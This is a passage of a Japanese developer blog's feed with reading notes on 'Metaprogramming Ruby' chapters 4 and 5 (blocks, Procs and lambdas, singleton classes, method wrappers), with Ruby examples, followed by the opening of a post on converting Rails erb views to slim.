obj.write
p obj.read # =&amp;gt; 2
p Myclass.read # =&amp;gt; 1
&lt;/pre>
&lt;p>ここでは2つの異なるオブジェクトである@my_varを定義しています。
クラスもオブジェクトの一つであるということを念頭において考えて行くのが大事になってきます。
最初にでてくる@my_varがクラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数。2つ目@my_varが今回だとobjオブジェクトの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数ですね。
（ここ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>では1つ目の@my_varがobjの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数で2つ目の@my_varがMyclassのクラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数だ、と書かれているのですが、コードの順番で行くと逆なので少しわかりにくかったです。説明の順番としては仕方ないのかもしれないですが。）
クラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数はClassクラスに属しているオブジェクトの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数というのが正しいです。MyclassはClassクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>なのでその中で定義されたものはクラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数となります。
クラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数はクラスしかアクセスできず、そのクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>からアクセスすることはできません。&lt;/p>
&lt;h3 id="特異メソッド-1">特異メソッド&lt;/h3>
&lt;p>Stringに属したオブジェクトが全て大文字化かどうかをbooleanで返すメソッドをつくりたいが、特定の文字列にしかこのメソッドをもたせたくない、という場合。Refinementsを使って、特定のコードの前にusingを挿入するという方法もありますが、別の方法もあります。それが特異メソッドです。
同じクラスのオブジェクトでも、ある特定のオブジェクトにだけメソッドを追加したい、という場合に特異メソッドを使うことができます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> str = "string"
def str.title?
self.upcase == self
end
p str.title? # =&amp;gt; false
p str.methods.grep(/title?/) # =&amp;gt; [:title?]
p str.singleton_methods # =&amp;gt; [:title?]
&lt;/pre>
&lt;p>今までクラスに定義していたクラスメソッド&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> Class Hoge
def self.a_method
end
end
&lt;/pre>
&lt;p>これはクラスもオブジェクトであるという点からみれば&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> Hoge = Class.new
def Hoge.a_method
end
&lt;/pre>
&lt;p>という形とやっていることは同じです。つまりクラスメソッドはクラスの特異メソッドであるという事になります。&lt;/p>
&lt;h3 id="クラスマクロ">クラスマクロ&lt;/h3>
&lt;p>attt_*のようなメソッドをクラスマクロと呼ぶ。selfがクラスでも使えるのでクラスメソッドということですね。&lt;/p>
&lt;h2 id="特異クラス">特異クラス&lt;/h2>
&lt;p>特異メソッドがどこに定義されているのか？という問の答えが特異クラスです。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> obj = Object.new
p obj # =&amp;gt; #&amp;lt;Object:0x00007f9fa893a068&amp;gt;
p obj.singleton_class # =&amp;gt; #&amp;lt;Class:#&amp;lt;Object0x00007f9fa893a068&amp;gt;&amp;gt;
singleton_class = class &amp;lt;&amp;lt; obj
p self # =&amp;gt; #&amp;lt;Class:#&amp;lt;Object:0x00007f9fa893a068&amp;gt;&amp;gt;
end
&lt;/pre>
&lt;p>この例では&amp;lt;Class:#&amp;lt;Object:0x00007f9fa893a068&amp;gt;&amp;gt;がobjオブジェクトの特異クラスです。
class &amp;lt;&amp;lt; objでも発見することができますが、singleton_classメソッドを使ったほうが楽でしょう。
オブジェクトのメソッド探索を行う際にはオブジェクトのクラスをみてそして更に親のクラスへとたどって行きますが、実は、オブジェクトのクラスのメソッドを見る前に、そのオブジェクトの特異クラスのメソッドを見にいっているのです。
クラスにもクラスはあるので、当然特異クラスがつくれます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class C
class &amp;lt;&amp;lt; self
def a_class_method
'C.a_class_method()'
end
end
end
&lt;/pre>
&lt;p>これは要は&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class C
def self.a_class_method
'C.a_class_method()'
end
end
&lt;/pre>
&lt;p>と同じで、クラスメソッドはそもそもそのクラスの特異クラスに定義されています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> p C.singleton_class.superclass # =&amp;gt; #&amp;lt;Class:Object&amp;gt;
p C.superclass # =&amp;gt; Object
&lt;/pre>
&lt;p>このようにクラスの特異クラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>はクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>の特異クラスになります。&lt;/p>
&lt;h3 id="大統一理論">&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C2%E7%C5%FD%B0%EC%CD%FD%CF%C0">大統一理論&lt;/a>&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のオブジェクトのルールとして７つのルールが示されています。&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>オブジェクトは一種類しかない。それが通常のオブジェクトかモジュールになる。&lt;/li>
&lt;li>モジュールは一種類しかない。それが通常のモジュール、クラス、特異クラスのいずれかになる。&lt;/li>
&lt;li>&lt;p>メソッドは一種類しかない。メソッドはモジュール（大半はクラス）に住んでいる。
一種類しかないということは複数から同時に継承しないということです。下記の５にありますが、必ず親から子への一直線以外に継承はしていません。&lt;/p>&lt;/li>
&lt;li>&lt;p>全てのオブジェクトは（クラスも含めて）「本物のクラス」を持っている。それが通常のクラスか特異クラスである。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>でのいわゆる「右へ」の移動で、本物のクラス、つまり特異クラスをもっているということですね。ほとんどのオブジェクトは特異クラスをもっています。true, false, &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/nil">nil&lt;/a>は持っていません。（NilClass等はもっていますが。）&lt;/p>&lt;/li>
&lt;li>&lt;p>すべてのクラスは（BasicObjectを除いて）一つの祖先（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>かモジュール）を持っている。つまりあらゆるクラスがBasicObjectに向かって1本の継承チェーンをもっている。
これと1,2,3のルールのおかげでメソッド探索はわかりやすいものになっていると思います。継承チェーンは二股に別れたりはしていません。&lt;/p>&lt;/li>
&lt;li>&lt;p>オブジェクトの特異クラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>は、オブジェクトのクラスである。クラスの特異クラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>はクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>の特異クラスである&lt;/p>&lt;/li>
&lt;li>メソッドを呼び出すときは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>はレシーバーの本物のクラスに向かって右へ進み、継承チェーンを「上へ」進む。
この２つからなぜ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>がクラスメソッドにアクセス出来ないかを説明することができます。
クラスメソッドはそのクラスの特異クラスに定義されています。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のメソッド探索では一度だけしか右に行かないので、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>からメソッド探索をおこなった場合、メソッドの特異クラスへと一度右に行った後はその特異クラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>であるobj.classが戻すクラスから上に探索していくので、その&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>の特異クラスまでは探索しません。よって&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A1%BC%A5%D1%A1%BC%A5%AF%A5%E9%A5%B9">スーパークラス&lt;/a>の特異クラスにあるメソッドは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>からはアクセスできないということになります。&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;h3 id="Objectextend">Object#extend&lt;/h3>
&lt;p>モジュールをincudeするとモジュールの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドのみがincludeしたクラスで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドとして使えるようになりますが、
クラスの特異メソッドを開いて、その中でモジュールをincludeするとモジュールの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドをクラスメソッドとして定義できます。
オブジェクトの特異クラスにも同様にでき、よく使われるので、Object#extendとしてメソッドが提供されています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module MyModule
def my_method; p 'hello'; end
end
class MyClass
extend MyModule
end
MyClass.my_method # =&amp;gt; 'hello'
&lt;/pre>
&lt;h2 id="メソッドラッパー">メソッドラッパー&lt;/h2>
&lt;h3 id="アラウンドエイリアス">アラウンド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>メソッドに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>をつける&lt;/li>
&lt;li>メソッドを再定義する&lt;/li>
&lt;li>新しいメソッドから古いメソッドを呼び出す。
こうすることで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>では元のメソッドの内容が参照されるため、&lt;/li>
&lt;/ol>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class String
alias_method :origin_reverse!, :reverse!
def reverse!
upcase!
origin_reverse!
end
end
p "ruby".reverse! # =&amp;gt; "YBUR"
&lt;/pre>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>を定義することで、メソッドの再定義を行う時に、元のメソッドを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>メソッドで呼び出して、ラップすることができます。
ここでは古い&lt;code>reverse!&lt;/code>を新しい&lt;code>reverse!&lt;/code>にラップしています。一種のモンキーパッチにも近い方法です。
新しい&lt;code>reverse!&lt;/code>は古い&lt;code>reverse!&lt;/code>の周囲（アラウンド）をラップしているのでこのトリックをアラウンド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>をと呼びます。&lt;/p>
&lt;h3 id="Refinements">Refinements&lt;/h3>
&lt;p>Refinementsを使ってsuperを呼び出すと元のメソッドを呼び出せます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module StringRefinements
refine String do
def reverse!
upcase!
super
end
end
end
using StringRefinements
p "python".reverse! # =&amp;gt; "NOHTYP"
&lt;/pre>
&lt;h3 id="Prependラッパー">Prependラッパー&lt;/h3>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module ExpilcitString
def reverse!
upcase!
super
end
end
String.class_eval do
prepend ExpilcitString
end
p "go".reverse! # =&amp;gt; "OG"
&lt;/pre>
&lt;p>Prependは継承チェーンの下にモジュールが挿入されるのでメソッド探索の際にはprependされたモジュールにあるメソッドが先に使われる。&lt;/p>
&lt;h2 id="５章のクイズ">５章のクイズ&lt;/h2>
&lt;p>最初はsuperで解決しようとしたんですが、古い+に依存しているのでなかなか書けませんでした…
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のようにアラウンド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>で解決するのが良さそうです。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>クラスメソッドがどこに定義されているのか？という問いに答えてくれる章でしたね。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>を読んでextendってなんだ？となることが多かったので、extendで特異クラスにメソッドを定義できるのは知っておきたいところ。
また特異クラスには特異クラスがあるので特異クラスの特異クラスの特異クラスとずっとつなげて行けるのでは…&lt;/p>
&lt;/body></description></item><item><title>メタプログラミングRuby 四章 ブロックの読書録</title><link>https://qwyng.dev/posts/2019/01/18/150157/</link><pubDate>Fri, 18 Jan 2019 15:01:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/01/18/150157/</guid><description>&lt;body>
&lt;ul class="table-of-contents">
&lt;li>&lt;a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB">はじめに&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AF%E5%BC%B7%E5%8A%9B%E3%81%AA%E3%83%84%E3%83%BC%E3%83%AB">ブロックは強力なツール&lt;/a>&lt;ul>
&lt;li>&lt;a href="#%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AF%E6%9D%9F%E7%B8%9B%E3%82%92%E5%8C%85%E3%82%93%E3%81%A7%E3%81%8F%E3%82%8C%E3%82%8B">ブロックは束縛を包んでくれる&lt;/a>&lt;/li>
&lt;li>&lt;a href="#instance_eval">instance_eval&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E5%8F%AF%E8%83%BD%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88">呼び出し可能オブジェクト&lt;/a>&lt;ul>
&lt;li>&lt;a href="#Proc%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88">Procオブジェクト&lt;/a>&lt;/li>
&lt;li>&lt;a href="#Method%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88">Methodオブジェクト&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#%E5%9B%9B%E7%AB%A0%E3%81%AE%E3%82%AF%E3%82%A4%E3%82%BA">四章のクイズ&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB">おわりに&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="はじめに">はじめに&lt;/h1>
&lt;p>前職の出勤が１６日に終わり、しばし&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%CB%A1%BC%A5%C8">ニート&lt;/a>しております。
最近&lt;a href="https://github.com/meew0/discordrb">discordb&lt;/a>という&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DC%A5%A4%A5%B9%A5%C1%A5%E3%A5%C3%A5%C8">ボイスチャット&lt;/a>アプリの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/bot">bot&lt;/a>作成のラッパーGemが面白くていじっているんですが、このGemを読んでいると&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>の４章にこんなのあったなぁという気持ちが強まり、読書録として少し理解を文章に起こしてみました。５章と６章も個人的に何度でも反芻したいので書いていきたい。&lt;/p>
&lt;h1 id="ブロックは強力なツール">ブロックは強力なツール&lt;/h1>
&lt;p>この章ではブロックがスコープを操る強力なツールだということを解説してくれています。
あと途中で上司が逃げます&lt;/p>
&lt;h2 id="ブロックは束縛を包んでくれる">ブロックは束縛を包んでくれる&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>ではdef、class、module （これらはスコープを開く門）でスコープが切り替わってローカル変数なんかは共有できなくなります。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Hogeclass
class_value = 1
def hoge_method
p class_value # =&amp;gt; Error!
end
end
&lt;/pre>
&lt;p>裏を返すとこの門を開かなければ新しいスコープは開かれません。
class やmoduleであればClass.new {}やModule.new {}としたり、
defをdefine_method { }にしてブロックを渡すことで新しいスコープが開かれなくなります。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Hogeclass
class_value = 1
define_method :hoge_method do
p class_value # =&amp;gt; 1
end
end
&lt;/pre>
&lt;p>このようにブロックは現在の束縛を包み込んでnewやdefine_methodといったメソッドに渡すことができます。&lt;/p>
&lt;h2 id="instance_eval">instance_eval&lt;/h2>
&lt;p>instance_evalはBasicObjectの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドでブロックを渡すとレシーバーをselfにして評価してくれます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Hogeclass
def initialize
@foo = "value"
end
private
def private_method
p "秘密"
end
end
hoge = Hogeclass.new
hoge.instance_eval do
@foo # =&amp;gt; "value"
end
hoge.instance_eval do
private_method # =&amp;gt; "秘密"
end
&lt;/pre>
&lt;p>instance_evalを使えば例えばテストを書く際にクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数をいじったり、クリーンなオブジェクト（BasicObjectの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>等)を作ってブロックを評価することができます。&lt;/p>
&lt;h2 id="呼び出し可能オブジェクト">呼び出し可能オブジェクト&lt;/h2>
&lt;p>ブロックの「コードを保管して、あとから実行する」という方式はなにもブロックだけのものではありません。&lt;/p>
&lt;h3 id="Procオブジェクト">Procオブジェクト&lt;/h3>
&lt;p>ブロックはオブジェクトではないので後で呼び出したりしたい時に不便です。
ブロックをオブジェクトにするものとして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>にはProcクラスがあります。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> double = Proc.new { |x| x * 2 }
double.call(4) # =&amp;gt; 8
&lt;/pre>
&lt;p>わかりやすい変数に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>をいれておけるので呼び出しも楽ですね。&lt;/p>
&lt;p>ブロックをProcに変換するのに便利なメソッドもあります。lambdaとprocです。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> double = lambda { |x| x * 2 }
# =&amp;gt; &amp;lt;Proc:0x00007f9e5~~~
triple = proc { |x| x * 3 }
# =&amp;gt; &amp;lt;Proc:0x00007f9e5~~
&lt;/pre>
&lt;p>どちらもProcの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>がつくられてるのがわかりますね。
Proc , proc とlamdaの違いとしてreturnの意味合いが違うことと、引数のチェックが違うことが挙げられます。
returnの意味合いが違うというのは以下のコードで確認できます。
（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>ではProc.newとlamdaの違いしかなかったので今回はprocで試してみました）&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def lambda_ten_double
lambda_proc = lambda { return 10 }
result = lambda_proc.call
return result * 2
end
def proc_ten_double
proc_proc = proc { return 10 }
result = proc_proc.call #ここでProcが定義されたスコープから戻ってしまう
return result * 2 #ここまでたどり着かない
end
lambda_ten_double # =&amp;gt; 20
proc_ten_double # =&amp;gt; 10
&lt;/pre>
&lt;p>引数のチェック方法にも違いがあり、&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> p = Proc.new { |a,b| [a,b] }
l = lambda { |a,b| [a,b] }
p.call(1, 2, 3)　# =&amp;gt; [1, 2]
l.call(1, 2, 3) #=&amp;gt; ArgumentError (wrong number of arguments~
&lt;/pre>
&lt;p>項数にも厳しくreturnの挙動も単なる終了なので特別な理由がなければlambdaを用いたほうが良さそうです。&lt;/p>
&lt;p>&amp;amp;修飾でもブロックをProcに変換することができます。
また&amp;amp;修飾をつかえばProcオブジェクトをブロックに戻すこともできます。
どういうことかというと、&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def block_method
yield
end
def do_block_method(&amp;amp;block)　#ここの&amp;amp;でブロックをProcオブジェクトに
p block.class # =&amp;gt; Proc ＆つけないとProcのまま！
block_method(&amp;amp;block) # ここの&amp;amp;でProcオブジェクトからブロックに変換、 ないとオブジェクト渡してしまうのでArgumentエラー
end
do_block_method { p "hoge" } # =&amp;gt; "hoge"
&lt;/pre>
&lt;p>{ p "&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/hoge">hoge&lt;/a>" } が一度Procオブジェクトになり、またブロックにもどって最終的にblock_methodに渡されていることなります。&lt;/p>
&lt;h3 id="Methodオブジェクト">Methodオブジェクト&lt;/h3>
&lt;p>メソッドも呼び出し可能なオブジェクトです。
具体的には&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Hogeclass
def initialize
@x = "hoge"
end
def hogemethod
@x
end
end
hogeobject = Hogeclass.new
method = hogeobject.method :hogemethod
method.call # =&amp;gt; "hoge"
&lt;/pre>
&lt;p>メソッドオブジェクトは呼び出した時にオブジェクトのスコープで評価される。（今回はHogeclassクラス)&lt;br>
この束縛は解除して別のオブジェクトに束縛したりもできる。（ただし同じクラスかそのサブクラスのオブジェクトに限る）&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Fugaclass &amp;lt; Hogeclass
def initialize
@x = "fuga"
end
end
unboundmethod = method.unbind
fugaobject = Fugaclass.new
rebindmethod = unboundmethod.bind(fugaobject)
rebindmethod.call # =&amp;gt; "fuga"
&lt;/pre>
&lt;h2 id="四章のクイズ">四章のクイズ&lt;/h2>
&lt;p>自分は４章最後のクイズでは、サンプルを見る前に以下のようなコードを書いていました。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def setup(&amp;amp;block)
@setups &amp;lt;&amp;lt; block
end
def event(description, &amp;amp;block)
@setups.map(&amp;amp;:call)
puts "ALERT: #{description}" if block.call
end
@setups = []
load 'events.rb'
&lt;/pre>
&lt;p>eventごとに実行するならevent内でsetupに渡されたProcよびだしても良いのでは？と思って書きました。少し一つのメソッドでやりすぎかも。&lt;br>
この処理だけ行いたいならeventメソッドの 引数&amp;amp;blockは削除して、後置ifもif yieldにしても動作すると思いますが、ブロックを渡す必要があるメソッドでそんなことをしたらわかりにくすぎますね。&lt;br>
改めて見ると逃げた上司のの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4">グローバル変数&lt;/a>をどうして削除しない？が刺さるコードです。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4">グローバル変数&lt;/a>を削除して、&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> lambda {
setups = []
Kernel.send :define_method, :setup do |&amp;amp;block|
setups &amp;lt;&amp;lt; block
end
Kernel.send :define_method, :event do |description, &amp;amp;block|
setups.map(&amp;amp;:call)
puts "ALERT: #{description}" if block.call
}.call
load 'events.rb'
&lt;/pre>
&lt;p>という形にしてみました。&lt;/p>
&lt;h1 id="おわりに">おわりに&lt;/h1>
&lt;p>一度読んだ本をいざ文章にまとめてみるといろいろ考えることが多くていいですね。ガシガシ続けて行きたひ。
色んな人からツッコミもらいたいのでQiitaに書くか迷いましたが、このブログの主目的が「本の理解を文におこして再確認する」と考えていますし、先人の知見をQiitaに乗っけるのは違くない？と思ってブログに起こしました。&lt;/p>
&lt;/body></description></item><item><title>erbからslimへ　html2slimの変換で少し気になったこと</title><link>https://qwyng.dev/posts/2018/12/31/235814/</link><pubDate>Mon, 31 Dec 2018 23:58:00 +0900</pubDate><guid>https://qwyng.dev/posts/2018/12/31/235814/</guid><description>&lt;body>
&lt;h4>erbからslimへ&lt;/h4>
&lt;p>年末の空いた時間に、個人でたたき台として使っている&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>アプリのviewをerbからslimに変えて見ました。&lt;/p>
&lt;p>&lt;a href="https://github.com/QWYNG/GuideGG">GitHub - QWYNG/GuideGG: チャンピオンに対するガイド記事のブックマークサイト&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/slim-template/slim">slim&lt;/a>と&lt;a href="https://github.com/slim-template/html2slim">html2slim&lt;/a>、２つのgemを入れて
&lt;s>&lt;/s>&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> for i in app/views/**/*.erb; do erb2slim $i ${i%erb}slim &amp;amp;&amp;amp; rm $i; done
&lt;/pre>
&lt;p> 変換して削除を繰り返すでコマンド一つで変換できたので楽でしたね
&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> erb2slim app/views -d &lt;/pre>
&lt;p>でもできます。
&lt;a href="https://github.com/slim-template/html2slim">HTML2Slim
のREADME &lt;/a>でも紹介ありますがデェレクトリ指定できるのでforで回す必要ないですね。-dはdelete オプションです。
（コメントありがとうございます！）&lt;/p>
&lt;h5>slim、読みやすい&lt;/h5>
&lt;p>&lt;a href="https://github.com/slim-template/slim/blob/master/README.md">slimのREADME&lt;/a>を読んでいてまず覚えておくべきことは&lt;/p>
&lt;ul>
&lt;li>- が制御コードを意味している。(forとかif)　endもいらないようです。&lt;/li>
&lt;li>= が出力する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>コードの呼び出し（erbでの&amp;lt;%= %&amp;gt;)&lt;/li>
&lt;li>| を使うとパイプよりも深くインデントされた全ての行をコピーする。&lt;/li>
&lt;/ul>
&lt;p>程度だと感じました。erbとくらべてすっきりして読みやすいです。&lt;/p>
&lt;h4>気になったこと&lt;/h4>
&lt;p>いくつか気になったことをメモしておきます。&lt;/p>
&lt;h5>
